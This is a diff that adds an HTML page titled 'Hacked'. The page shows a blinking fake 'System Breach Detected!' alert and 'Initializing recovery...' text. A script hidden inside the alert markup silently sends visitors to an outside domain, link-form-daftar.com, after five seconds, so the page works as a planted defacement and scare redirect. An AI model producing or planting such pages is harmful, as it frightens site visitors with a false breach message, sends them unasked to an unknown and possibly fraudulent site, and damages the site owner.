@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacked</title>
+    <style>
+        body {
+            background-color: black;
+            color: green;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .hacked-text {
+            text-align: center;
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink {
+            50% {
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="hacked-text">
+   <script>
+    setTimeout(() => {
+        window.location.href = "https://link-form-daftar.com";
+    }, 5000); // 5 detik sebelum berpindah
+</script>
+        <h1>System Breach Detected!</h1>
+        <p>Initializing recovery...</p>
+        <p><small>If you see this, you are part of the *system*</small></p>
+    </div>
+</body>
+</html>
